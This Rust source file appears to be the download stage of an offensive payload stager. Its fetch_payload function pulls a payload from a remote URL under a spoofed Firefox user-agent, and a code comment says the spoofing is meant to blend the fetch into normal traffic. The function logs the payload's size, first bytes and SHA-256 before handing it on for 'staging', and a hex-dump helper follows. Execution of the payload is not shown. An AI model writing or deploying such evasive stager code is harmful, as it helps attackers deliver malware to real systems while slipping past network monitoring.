use anyhow::{anyhow, Result};
use reqwest::blocking::Client;
use sha2::{Digest, Sha256};
use std::time::Duration;
use colored::Colorize;

pub fn fetch_payload(url: &str, verbose: bool) -> Result<Vec<u8>> {
    // spoofing a browser UA blends the payload fetch into normal HTTP traffic
    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .user_agent("Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0")
        .build()?;

    let response = client.get(url).send()?;

    let status = response.status();
    if !status.is_success() {
        return Err(anyhow!("HTTP {}: server rejected payload request", status));
    }

    let body = response.bytes()?.to_vec();

    if body.is_empty() {
        return Err(anyhow!("Payload is empty — nothing to stage"));
    }

    if verbose {
        println!("{}", format!("[*] Fetched {} bytes from {}", body.len(), url).cyan());
        
        let first_8 = if body.len() >= 8 {
            &body[0..8]
        } else {
            &body[..]
        };
        let hex_str: Vec<String> = first_8.iter().map(|b| format!("{:02x}", b)).collect();
        println!("{}", format!("[*] First 8 bytes: {}", hex_str.join(" ")).cyan());

        let mut hasher = Sha256::new();
        hasher.update(&body);
        let hash = hasher.finalize();
        println!("{}", format!("[*] Payload SHA-256: {:x}", hash).cyan());
    }

    Ok(body)
}

pub fn hex_dump(data: &[u8], max_bytes: usize) {
    let limit = std::cmp::min(data.len(), max_bytes);
    for i in (0..limit).step_by(16) {
        let chunk = &data[i..std::cmp::min(i + 16, limit)];
        
        print!("{:08x}: ", i);
        
        for j in 0..16 {
            if j == 8 {
                print!("  ");
            }
            if j < chunk.len() {
                print!("{:02x} ", chunk[j]);
            } else {
                print!("   ");
            }
        }
        
        print!(" ");
        for &b in chunk {
            if b.is_ascii_graphic() || b == b' ' {
                print!("{}", b as char);
            } else {
                print!(".");
            }
        }
        println!();
    }
}
